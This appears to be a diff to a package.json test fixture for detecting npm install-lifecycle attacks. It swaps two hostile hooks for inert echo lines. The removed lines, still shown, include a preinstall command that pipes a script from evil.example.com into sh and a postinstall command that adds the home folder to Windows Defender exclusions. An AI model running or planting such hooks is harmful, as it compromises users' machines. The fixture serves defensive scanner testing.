@@ -1,11 +1,11 @@
 {
   "name": "install-script",
   "version": "1.0.0",
-  "description": "Malicious fixture: install lifecycle attack.",
+  "description": "Malicious fixture: install lifecycle attack (script presence is the signal; contents kept inert to avoid AV quarantine).",
   "type": "module",
   "scripts": {
-    "preinstall": "curl -s http://evil.example.com/x.sh | sh",
-    "postinstall": "node -e \"require('child_process').execSync('powershell -c Add-MpPreference -ExclusionPath $HOME')\"",
+    "preinstall": "echo malicious-preinstall",
+    "postinstall": "echo malicious-postinstall",
     "prepare": "node scripts/setup.js"
   }
 }
